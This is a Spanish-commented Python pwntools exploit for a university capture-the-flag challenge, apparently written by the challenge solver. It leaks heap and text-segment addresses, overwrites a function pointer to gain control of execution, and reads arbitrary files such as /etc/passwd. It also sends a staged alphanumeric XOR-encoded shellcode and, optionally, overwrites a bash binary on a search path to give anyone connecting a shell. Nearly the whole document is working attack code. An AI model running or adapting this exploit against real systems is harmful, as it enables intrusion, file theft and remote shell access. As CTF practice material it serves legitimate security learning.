#####################################################################
# Reto Unusual Database, UAM Mayo 2022.
# Exploit que resuelve cualquiera de las 3 partes del reto de la UAM
# mediante 2 unintended ways, y de paso se salta las restricciones del
# alphanumeric shellcode impuestas en la tercera flag.
#
#
# Tambien se puede ejecutar de modo "intended", para la parte 3, 
# y lanza un shellcode alfanumerico que ejecuta un read() para luego
# mandar un segundo stage payload con shellcode tradicional.
# ver "USO" y "EJEMPLOS".
#
# Finalmente, logro un bypass completo de /usr/bin/bash para ejecutar
# una versión escrita sobre /usr/local/sbin/bash (aprovechando una
# vulnerabilidad de search path) para lograr SHELL. Ejecutar el script
# con los argumentos: SHELLCODE SHELL.
#
# 2022 by Toni Castillo Girona (Socialk@s) 
# Twitter: @Disbauxes
#
#   USO:
#       python3 exploit.py [REMOTE] [ARCHIVO=/path/a/archivo/a/leer] | [SHELLCODE] [SHELL]
#   EJEMPLOS:
#       python3 exploit.py REMOTE ARCHIVO=flag3.txt
#       python3 exploit.py REMOTE ARCHIVO=/etc/passwd
#       python3 exploit.py REMOTE ARCHIVO=/proc/self/exe
#		Flag usando el alfanumeric shellcode (intended way parte 3):
#       python3 exploit.py REMOTE SHELLCODE
#		Lograr shell remota (OJO! se carga el reto):
#       python3 exploit.py REMOTE SHELLCODE SHELL
#   HERRAMIENTAS USADAS
#       r2
#       gdb
#       pwntools
#   UNINTENDED WAYS
#       HardFlag1 
#		Logramos el control de EIP mediante leaks
#       de sus chunks, de ahí el base address del HEAP y logramos 
#		imprimir mediante la propia rutina que imprime registros de tipo 
#		cadena para que nos revele su dirección completa en el segmento
#		de texto. Técnica similar a como hacemos leaks de la libc6 con
#		puts@plt, por ejemplo.
#
#       HardFlag2 
#		Ya que tenemos control del puntero EIP y controlamos
#       el HEAP, basta con apuntar EIP a la función que es llamada desde
#       easy_flag y hard_flag para abrir flag1.txt o flag2.txt y pasarle
#       como parámetro flag3.txt (o cualquier otro archivo!). El parámetro
#       del nombre de archivo se pasa a la función desde un chunk en el
#       HEAP, así que lo usamos para escribir el archivo y listo. ¡Bypass
#       en toda regla del sistema de alphanumeric shellcoding!
#
#       Este exploit es altamente estable. NO funcionará en entornos
#		diferentes al del docker del reto. Testeado en local y remoto
#		contra:
#			parrot 5.0 		(5.16.0-12parrot1-amd64, Debian GLIBC 2.31-13+deb11u3)
#			Ubuntu 20.04	(
#
#		Para otras versiones de S.O o glibc, bastará con ajustar
#		los offsets de los chunks utilizados para los diferentes
#		leaks y listo.
#####################################################################
from pwn import *

context.arch = "amd64"

# Archivo a abrir; puede ser cualquiera de las flags:
# flag1.txt, flag2.txt, flag3.txt o cualquier otro archivo:
if not args.ARCHIVO:
    archivo = "flag3.txt"
else:
    archivo = args.ARCHIVO

def edit_int_record(idx,value):
	io.sendlineafter("choice: ","3")
	io.sendlineafter("number: ",str(idx))
	io.sendlineafter("choice: ","1")
	io.sendlineafter("integer: ",value)

def edit_str_record(idx,value):
	io.sendlineafter("choice: ","3")
	io.sendlineafter("number: ",str(idx))
	io.sendlineafter("choice: ","3")
	io.sendafter("string: ",value)

def add_str_record(value):
	io.sendlineafter("choice: ","1")
	io.sendlineafter("choice: ","3")
	io.sendlineafter("Enter a string:",value)

# Abrimos un proceso local o remoto segun variable REMOTE
if args['REMOTE']:
	 #io = remote('52.213.87.125', 2205)
	 # Descomentar esto para hacer las pruebas en un entorno
	 # con socat (fds, etc):
	 # socat -dd TCP4-LISTEN:9000,fork,reuseaddr EXEC:./binary,pty,raw,iexten=0,echo=0
	 io = remote('127.0.0.1', 2205)
else:
	binary = ELF("./binary")
	io = process(binary.path)

# Viendo el código con r2, se pueden ver los siguientes OFFSETS
# para 3 rutinas que imprimen un registro según su tipo. Nos
# interesan las 2 primeras aunque el intended way usa las tres:
#	fcn.00005000	int
#	fcn.0000504e	str		; ideal para hacer leaks!
#	fcn.00005027	chr

# Creamos 2 registros de tipo string de 0x7f de longitud.
# Se reservaran 2 chunks con malloc de 0x90 bytes:
add_str_record('A'*0x7e)
add_str_record('B'*0x7e)

# Editamos el record 1 (será el primero de la lista) como int:
edit_int_record(1,"a")

# Listamos los registros. Tras editar un entero, solemos recibir
# un "invalid choice":
io.sendlineafter("choice: ","4")

# Ahora obtenemos el leak del chunk del último registro
# creado (que pasa a ser Record 0); ultimos 4 bytes.
io.recvuntil("Record 1\n")
leak_chunk = int(io.recvline().rstrip()) & 0xffffffff
info("Record 0 Chunk leaked offset is %s", hex(leak_chunk).zfill(8))

# Una vez tenemos esta dirección, calculamos dónde empieza la
# dirección de la lista (donde se posa siempre rbx):
heap_offset	=	0x90
heap_start	=	leak_chunk + heap_offset
info("HEAP records list offset at: %s ", hex(heap_start).zfill(8))

# Esta es la estructura de los records:
# rbx <- base
# rbx+0x10  <- EIP
# rbx + (idx*0x18)  		:   record idx
# rbx + (idx*0x18) + 8		:	record_type (0 int, 1 char, 2 str)
# Ejemplo:
#0x55e99e973520:	0x000055e99e975a10	0x0000000000000002
#0x55e99e973530:	0x000055e99e12f04e	0x000055e99e973420
#0x55e99e973540:	0x0000000000000000	0x0000000000000031
#0x55e99e973550:	0x00007f0f6bea7c00	0x00007f0f6bea7c00

# A partir de la lista apuntada por RBX, en RBX+0x10 hay la función
# llamada para imprimir registros. Por tanto, control sobre EIP.
# Esta dirección se sobreescribe con la función pertinente según
# sea un registro de tipo int, char o string.
eip			=	heap_start + 0x10
info("Control over EIP at offset %s", hex(eip).zfill(8))

# Calculamos el offset del segundo chunk (pasa a ser registro 0).
# A partir de rbx, cada nuevo registro esta a +0x18 bytes:
chunk2		=	heap_start + 0x18
info("Record 0 at offset %s ", hex(chunk2).zfill(8))

# Vamos a extraer los primeros 2 bytes del segmento del HEAP aprovechando
# un chunk con una direccion en heap_start + 0x40:
edit_int_record(0,str(heap_start + 0x40 ))
edit_str_record(0,"x")
io.sendlineafter("choice: ","4")
io.recvuntil("Record 0\n")
heap_bytes = int(io.recv(6)[::-1].hex()[0:4],16)
info("Leaked first 2 bytes of HEAP segment: %s", hex(heap_bytes))

# Ahora podemos calcular la dirección completa del HEAP para heap_start:
heap_start_addr = int(hex(heap_bytes).zfill(4) +  hex(heap_start).zfill(8)[2:10],16)
info("HEAP records list at: %s ", hex(heap_start_addr).zfill(8))

# Y también la dirección completa de rbx+0x10 (control de EIP):
eip_addr = int(hex(heap_bytes).zfill(4) +  hex(eip).zfill(8)[2:10],16)
info("Control over EIP at %s ", hex(eip_addr).zfill(8))

# A partir de esta dirección, podemos calcular la base address del HEAP:
heap_base_addr =  heap_start_addr - 0x520
info("HEAP base address is %s", hex(heap_base_addr).zfill(8))

# Obtenemos ahora el leak del segmento de texto:
edit_int_record(0,str(eip_addr))
edit_str_record(0,'\x4e')
io.sendlineafter("choice: ","4")
io.recvuntil("Record 0\n")
text_leak = int(io.recv(6)[::-1].hex(),16)
info("Text segment leaked! %s", hex(text_leak))

# Calculamos ahora el offset respecto de hardflag.
# Aunque para este exploit, no usamos esta función:
hard_flag   =   text_leak + 0x27
info("Hard flag is at: %s", hex(hard_flag))

# Podemos calcular la base address del segmento de texto:
base_addr = hard_flag - 0x3075 
info("Text segment base address is %s", hex(base_addr).zfill(8))

# Tambien podemos calcular dónde cae la función que imprime la flag.
# Fijémonos que esta función recibe un argumento, que es el archivo que abre y
# muestra sobre el file descriptor 1. Desde easy_flag la llama así:
# 0x00005500    |        fcn.000031fe("flag1.txt");
# Así que esta función, a priori, nos puede servir para hacer un bypass
# completo del shellcode ideado por Julian XD;
cat_flag    =  base_addr + 0x11fe
info("cat_flag(flag)) is located at %s ", hex(cat_flag).zfill(8))

# Ahora usaremos el regisro 1 para controlar EIP
# y obtener la flag. En lugar de caer sobre hard_flag (intended way) y
# currarnos un payload alfanumérico, pues vamos a hacer un bypass que tengo prisa XD:
edit_int_record(1,str(eip_addr))
if not args.SHELLCODE:
	info("Bypaseando alfanumeric shellcode, unintended way 2...")
	# Tenemos el nombre del archivo a abrir en el heap, y controlamos el heap.
	# [#0] 0x7fda5fe0db90 → __libc_open64(file=0x55b858a1c520 "0šX\270U", oflag=0x0)
	# Se encuentra a 0x520 del heap start:
	filename = heap_base_addr + 0x520
	info("Chunk with flag to open: %s", hex(filename).zfill(8))
	edit_int_record(0,str(filename))
	# Ahora aquí podemos poner el archivo que queramos, porque podremos leerlo
	# mientras tengamos permisos, incluido /etc/passwd:
	info("Reading: %s " , archivo)
	edit_str_record(0,'%s\x00' % archivo)
	edit_str_record(1,p64(cat_flag))
	io.sendlineafter("choice: ","4")
	# El archivo nos llegará tras "Record 0":
	io.recvuntil("Record 0\n")
	# Y cuando tengamos Record 1, se habrá terminado de enviar todo su contenido:
	data=io.recvuntil("Record 1\n")
	info("Pwn!")
	# Lo imprimimos por pantalla:
	print(data.rstrip())
	io.close()
	# ¿Porqué sigo escribiendo sys.exit(0) en mi código python ;-))
	sys.exit(0)

if args.SHELLCODE:
	info("Intended way hardflag 3")
	edit_str_record(1,p64(hard_flag))
	io.sendlineafter("choice: ","4")
	io.recvuntil("0xfabada000\n")
	shellcode_addr = 0xfabada000
	info("Shellcode addr: %s ", hex(shellcode_addr))

	first_stage = asm("""
            /* Ponemos sobre rsi el buffer donde escribir el second_stage */
            /* OJO: está por defecto inicializado a 0xfabada000: */
            _set_arg2_buffer_rsi:
                push rbx
                pop rsi
            /* Ponemos el tamaño a leer sobre rdx (0x70 bytes): */
            _set_arg3_size:
                push 0x70
                pop rdx
            /* Decodificar syscall usando XOR */
            _decode_syscall:
                push 0x30303030
                pop rax
                xor dword ptr [rsi + 0x63], eax
            /* Debemos desplazar el OFFSET donde escribir el second_stage */
            /* para que "caiga" justo después de la llamada a syscall :*/
            _adjust_rsi_shellcode:
                /* rax= rsi = 0xfabada000 */
                push rsi
                pop rax 
                /* xor rax, rax = 0xf8b8d8057 */
                xor rax,0x20202057
                /* Volvemos a hacer XOR de rax */
                xor rax,0x20202030
                /* rax = 0xfabada067 */
                /* Actualizamos rsi con el nuevo OFFSET: */
                push rax
                pop rsi
                /* Debemos caer en 0x44, rellenaremos el resto con push & pops*/
            /* Ponemos syscall id en rax, 0 (read)*/
            _set_syscall_id:
                push 0x30303030
                pop rax
                xor rax,0x30303030
	         /* Padding para llegar a la llamada codificada syscall : */
            _padding:   
                push rax; pop rdi
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
          _extra_padding:
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
                push rax; pop rax
                push rax;
            _syscall_xored:
                /* Aqui van los 2 bytes de syscall codificados */
                /* 0x3f35. Estan xoreados con 0x30 */
                
            """)
	# Acabamos de añadir 4 bytes codificados:
	first_stage += b'\x60\x68\x3f\x35'
	info("First stage shellcode: %s",first_stage)

	# Segunda etapa, uno mas tradicional XD
	if args.SHELL:
		info("Bypass de /usr/bin/bash para obtener SHELL....")
		shell = asm(shellcraft.linux.open("/usr/local/sbin/bash",0x2242,0x1c0))
		shell += asm(shellcraft.linux.echo("/usr/bin/bash",3))
		shell += asm(shellcraft.linux.close(3))
		shell += asm(shellcraft.linux.exit(0))
		second_stage = shell
	else:
		info("Getting flag3...")
		readfile = asm(shellcraft.linux.readfile("flag3.txt",1))
		exit    =       asm(shellcraft.linux.exit(0))
		second_stage	=	readfile + exit
	
	# Lanzamos primer stage:
	info("Sending first-stage shellcode ... ")
	io.send(first_stage)

	# Second stage:
	info("Sending second-stage payload ... ")
	io.send(second_stage)
	data=io.recvall()
	print(data)

	if args.SHELL:
		info("Ahora ejecuta nc HOST PORT, shell para todos!")
